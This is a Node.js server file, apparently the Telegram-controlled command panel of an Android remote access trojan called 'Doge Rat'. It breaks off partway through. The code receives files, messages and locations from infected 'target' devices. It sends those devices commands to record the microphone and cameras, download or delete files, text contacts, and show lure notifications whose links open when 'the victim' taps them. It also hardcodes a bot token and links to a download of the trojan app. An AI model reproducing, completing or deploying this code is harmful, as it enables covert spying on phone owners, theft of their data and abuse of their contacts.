const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7357354055:AAH4W-B0qIRBRiNgts6KmeRRTUARauqwOMY'
const id = '6367172066'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">ð™Žð™šð™§ð™«ð™šð™§ ð™ªð™¥ð™¡ð™¤ð™–ð™™ð™šð™™ ð™¨ð™ªð™˜ð™˜ð™šð™¨ð™¨ð™›ð™ªð™¡ð™¡ð™®</h1> <br> <p style="font-size:16px; text-align:center; color:red;">Doge Rat App âž© <a style="text-decoration: none;" href="https://github.com/Master-xyx/FreeApp/raw/refs/heads/main/DogeApps.zip">Download</a></p> <br><br> <p style="font-size:36px; text-align:center; color:red;">Subscribe ðŸ”” âž© <a style="color:green; text-decoration: none;" href="https://youtube.com/@hackedtips">My YT Channel</a></p>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `Â°â€¢ ð™ˆð™šð™¨ð™¨ð™–ð™œð™š ð™›ð™§ð™¤ð™¢ <b>${req.headers.model}</b> ð™™ð™šð™«ð™žð™˜ð™š`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `Â°â€¢ ð™ˆð™šð™¨ð™¨ð™–ð™œð™š ð™›ð™§ð™¤ð™¢ <b>${req.headers.model}</b> ð™™ð™šð™«ð™žð™˜ð™š\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `Â°â€¢ ð™‡ð™¤ð™˜ð™–ð™©ð™žð™¤ð™£ ð™›ð™§ð™¤ð™¢ <b>${req.headers.model}</b> ð™™ð™šð™«ð™žð™˜ð™š`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `Â°â€¢ ð™‰ð™šð™¬ ð™™ð™šð™«ð™žð™˜ð™š ð™˜ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™\n\n` +
        `â€¢ á´…á´‡á´ Éªá´„á´‡ á´á´á´…á´‡ÊŸ : <b>${model}</b>\n` +
        `â€¢ Ê™á´€á´›á´›á´‡Ê€Ê : <b>${battery}</b>\n` +
        `â€¢ á´€É´á´…Ê€á´Éªá´… á´ á´‡Ê€êœ±Éªá´É´ : <b>${version}</b>\n` +
        `â€¢ êœ±á´„Ê€á´‡á´‡É´ Ê™Ê€ÉªÉ¢Êœá´›É´á´‡êœ±êœ± : <b>${brightness}</b>\n` +
        `â€¢ á´˜Ê€á´á´ Éªá´…á´‡Ê€ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `Â°â€¢ ð˜¿ð™šð™«ð™žð™˜ð™š ð™™ð™žð™¨ð™˜ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™\n\n` +
            `â€¢ á´…á´‡á´ Éªá´„á´‡ á´á´á´…á´‡ÊŸ : <b>${model}</b>\n` +
            `â€¢ Ê™á´€á´›á´›á´‡Ê€Ê : <b>${battery}</b>\n` +
            `â€¢ á´€É´á´…Ê€á´Éªá´… á´ á´‡Ê€êœ±Éªá´É´ : <b>${version}</b>\n` +
            `â€¢ êœ±á´„Ê€á´‡á´‡É´ Ê™Ê€ÉªÉ¢Êœá´›É´á´‡êœ±êœ± : <b>${brightness}</b>\n` +
            `â€¢ á´˜Ê€á´á´ Éªá´…á´‡Ê€ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('Â°â€¢ ð™‹ð™¡ð™šð™–ð™¨ð™š ð™§ð™šð™¥ð™¡ð™® ð™©ð™ð™š ð™£ð™ªð™¢ð™—ð™šð™§ ð™©ð™¤ ð™¬ð™ð™žð™˜ð™ ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™¨ð™šð™£ð™™ ð™©ð™ð™š ð™Žð™ˆð™Ž')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                'Â°â€¢ ð™‚ð™§ð™šð™–ð™©, ð™£ð™¤ð™¬ ð™šð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¢ð™šð™¨ð™¨ð™–ð™œð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™¨ð™šð™£ð™™ ð™©ð™¤ ð™©ð™ð™žð™¨ ð™£ð™ªð™¢ð™—ð™šð™§\n\n' +
                'â€¢ Ê™á´‡ á´„á´€Ê€á´‡êœ°á´œÊŸ á´›Êœá´€á´› á´›Êœá´‡ á´á´‡êœ±êœ±á´€É¢á´‡ á´¡ÉªÊŸÊŸ É´á´á´› Ê™á´‡ êœ±á´‡É´á´› Éªêœ° á´›Êœá´‡ É´á´œá´Ê™á´‡Ê€ á´êœ° á´„Êœá´€Ê€á´€á´„á´›á´‡Ê€êœ± ÉªÉ´ Êá´á´œÊ€ á´á´‡êœ±êœ±á´€É¢á´‡ Éªêœ± á´á´Ê€á´‡ á´›Êœá´€É´ á´€ÊŸÊŸá´á´¡á´‡á´…',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™‚ð™§ð™šð™–ð™©, ð™£ð™¤ð™¬ ð™šð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¢ð™šð™¨ð™¨ð™–ð™œð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™¨ð™šð™£ð™™ ð™©ð™¤ ð™©ð™ð™žð™¨ ð™£ð™ªð™¢ð™—ð™šð™§')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¢ð™šð™¨ð™¨ð™–ð™œð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™¨ð™šð™£ð™™ ð™©ð™¤ ð™–ð™¡ð™¡ ð™˜ð™¤ð™£ð™©ð™–ð™˜ð™©ð™¨')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¥ð™–ð™©ð™ ð™¤ð™› ð™©ð™ð™š ð™›ð™žð™¡ð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™™ð™¤ð™¬ð™£ð™¡ð™¤ð™–ð™™')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¥ð™–ð™©ð™ ð™¤ð™› ð™©ð™ð™š ð™›ð™žð™¡ð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™™ð™šð™¡ð™šð™©ð™š')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™ð™¤ð™¬ ð™¡ð™¤ð™£ð™œ ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™ð™š ð™¢ð™žð™˜ð™§ð™¤ð™¥ð™ð™¤ð™£ð™š ð™©ð™¤ ð™—ð™š ð™§ð™šð™˜ð™¤ð™§ð™™ð™šð™™')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™ð™¤ð™¬ ð™¡ð™¤ð™£ð™œ ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™ð™š ð™¢ð™–ð™žð™£ ð™˜ð™–ð™¢ð™šð™§ð™– ð™©ð™¤ ð™—ð™š ð™§ð™šð™˜ð™¤ð™§ð™™ð™šð™™')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™ð™¤ð™¬ ð™¡ð™¤ð™£ð™œ ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™ð™š ð™¨ð™šð™¡ð™›ð™žð™š ð™˜ð™–ð™¢ð™šð™§ð™– ð™©ð™¤ ð™—ð™š ð™§ð™šð™˜ð™¤ð™§ð™™ð™šð™™')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¢ð™šð™¨ð™¨ð™–ð™œð™š ð™©ð™ð™–ð™© ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™–ð™¥ð™¥ð™šð™–ð™§ ð™¤ð™£ ð™©ð™ð™š ð™©ð™–ð™§ð™œð™šð™© ð™™ð™šð™«ð™žð™˜ð™š')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¢ð™šð™¨ð™¨ð™–ð™œð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™–ð™¥ð™¥ð™šð™–ð™§ ð™–ð™¨ ð™£ð™¤ð™©ð™žð™›ð™žð™˜ð™–ð™©ð™žð™¤ð™£')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                'Â°â€¢ ð™‚ð™§ð™šð™–ð™©, ð™£ð™¤ð™¬ ð™šð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¡ð™žð™£ð™  ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™—ð™š ð™¤ð™¥ð™šð™£ð™šð™™ ð™—ð™® ð™©ð™ð™š ð™£ð™¤ð™©ð™žð™›ð™žð™˜ð™–ð™©ð™žð™¤ð™£\n\n' +
                'â€¢ á´¡Êœá´‡É´ á´›Êœá´‡ á´ Éªá´„á´›Éªá´ á´„ÊŸÉªá´„á´‹êœ± á´É´ á´›Êœá´‡ É´á´á´›Éªêœ°Éªá´„á´€á´›Éªá´É´, á´›Êœá´‡ ÊŸÉªÉ´á´‹ Êá´á´œ á´€Ê€á´‡ á´‡É´á´›á´‡Ê€ÉªÉ´É¢ á´¡ÉªÊŸÊŸ Ê™á´‡ á´á´˜á´‡É´á´‡á´…',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™‚ð™§ð™šð™–ð™©, ð™£ð™¤ð™¬ ð™šð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¡ð™žð™£ð™  ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™—ð™š ð™¤ð™¥ð™šð™£ð™šð™™ ð™—ð™® ð™©ð™ð™š ð™£ð™¤ð™©ð™žð™›ð™žð™˜ð™–ð™©ð™žð™¤ð™£')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™–ð™ªð™™ð™žð™¤ ð™¡ð™žð™£ð™  ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™¥ð™¡ð™–ð™®')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
                'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                'Â°â€¢ ð™’ð™šð™¡ð™˜ð™¤ð™¢ð™š ð™©ð™¤ ð™ð™–ð™© ð™¥ð™–ð™£ð™šð™¡\n\n' +
                'â€¢ Éªêœ° á´›Êœá´‡ á´€á´˜á´˜ÊŸÉªá´„á´€á´›Éªá´É´ Éªêœ± ÉªÉ´êœ±á´›á´€ÊŸÊŸá´‡á´… á´É´ á´›Êœá´‡ á´›á´€Ê€É¢á´‡á´› á´…á´‡á´ Éªá´„á´‡, á´¡á´€Éªá´› êœ°á´Ê€ á´›Êœá´‡ á´„á´É´É´á´‡á´„á´›Éªá´É´\n\n' +
                'â€¢ á´¡Êœá´‡É´ Êá´á´œ Ê€á´‡á´„á´‡Éªá´ á´‡ á´›Êœá´‡ á´„á´É´É´á´‡á´„á´›Éªá´É´ á´á´‡êœ±êœ±á´€É¢á´‡, Éªá´› á´á´‡á´€É´êœ± á´›Êœá´€á´› á´›Êœá´‡ á´›á´€Ê€É¢á´‡á´› á´…á´‡á´ Éªá´„á´‡ Éªêœ± á´„á´É´É´á´‡á´„á´›á´‡á´… á´€É´á´… Ê€á´‡á´€á´…Ê á´›á´ Ê€á´‡á´„á´‡Éªá´ á´‡ á´›Êœá´‡ á´„á´á´á´á´€É´á´…\n\n' +
                'â€¢ á´„ÊŸÉªá´„á´‹ á´É´ á´›Êœá´‡ á´„á´á´á´á´€É´á´… Ê™á´œá´›á´›á´É´ á´€É´á´… êœ±á´‡ÊŸá´‡á´„á´› á´›Êœá´‡ á´…á´‡êœ±ÉªÊ€á´‡á´… á´…á´‡á´ Éªá´„á´‡ á´›Êœá´‡É´ êœ±á´‡ÊŸá´‡á´„á´› á´›Êœá´‡ á´…á´‡êœ±ÉªÊ€á´‡á´… á´„á´á´á´á´€É´á´… á´€á´á´É´É¢ á´›Êœá´‡ á´„á´á´á´á´€É´á´…êœ±\n\n' +
                'â€¢ Éªêœ° Êá´á´œ É¢á´‡á´› êœ±á´›á´œá´„á´‹ êœ±á´á´á´‡á´¡Êœá´‡Ê€á´‡ ÉªÉ´ á´›Êœá´‡ Ê™á´á´›, êœ±á´‡É´á´… /start á´„á´á´á´á´€É´á´…',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'Â°â€¢ ð™‰ð™¤ ð™˜ð™¤ð™£ð™£ð™šð™˜ð™©ð™žð™£ð™œ ð™™ð™šð™«ð™žð™˜ð™šð™¨ ð™–ð™«ð™–ð™žð™¡ð™–ð™—ð™¡ð™š\n\n' +
                    'â€¢ á´á´€á´‹á´‡ êœ±á´œÊ€á´‡ á´›Êœá´‡ á´€á´˜á´˜ÊŸÉªá´„á´€á´›Éªá´É´ Éªêœ± ÉªÉ´êœ±á´›á´€ÊŸÊŸá´‡á´… á´É´ á´›Êœá´‡ á´›á´€Ê€É¢á´‡á´› á´…á´‡á´ Éªá´„á´‡'
                )
            } else {
                let text = 'Â°â€¢ ð™‡ð™žð™¨ð™© ð™¤ð™› ð™˜ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨ :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `â€¢ á´…á´‡á´ Éªá´„á´‡ á´á´á´…á´‡ÊŸ : <b>${value.model}</b>\n` +
                        `â€¢ Ê™á´€á´›á´›á´‡Ê€Ê : <b>${value.battery}</b>\n` +
                        `â€¢ á´€É´á´…Ê€á´Éªá´… á´ á´‡Ê€êœ±Éªá´É´ : <b>${value.version}</b>\n` +
                        `â€¢ êœ±á´„Ê€á´‡á´‡É´ Ê™Ê€ÉªÉ¢Êœá´›É´á´‡êœ±êœ± : <b>${value.brightness}</b>\n` +
                        `â€¢ á´˜Ê€á´á´ Éªá´…á´‡Ê€ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    'Â°â€¢ ð™‰ð™¤ ð™˜ð™¤ð™£ð™£ð™šð™˜ð™©ð™žð™£ð™œ ð™™ð™šð™«ð™žð™˜ð™šð™¨ ð™–ð™«ð™–ð™žð™¡ð™–ð™—ð™¡ð™š\n\n' +
                    'â€¢ á´á´€á´‹á´‡ êœ±á´œÊ€á´‡ á´›Êœá´‡ á´€á´˜á´˜ÊŸÉªá´„á´€á´›Éªá´É´ Éªêœ± ÉªÉ´êœ±á´›á´€ÊŸÊŸá´‡á´… á´É´ á´›Êœá´‡ á´›á´€Ê€É¢á´‡á´› á´…á´‡á´ Éªá´„á´‡'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, 'Â°â€¢ ð™Žð™šð™¡ð™šð™˜ð™© ð™™ð™šð™«ð™žð™˜ð™š ð™©ð™¤ ð™šð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™šð™£ð™™', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, 'Â°â€¢ ð™‹ð™šð™§ð™¢ð™žð™¨ð™¨ð™žð™¤ð™£ ð™™ð™šð™£ð™žð™šð™™')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`Â°â€¢ ð™Žð™šð™¡ð™šð™˜ð™© ð™˜ð™¤ð™¢ð™¢ð™šð™£ð™™ ð™›ð™¤ð™§ ð™™ð™šð™«ð™žð™˜ð™š : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
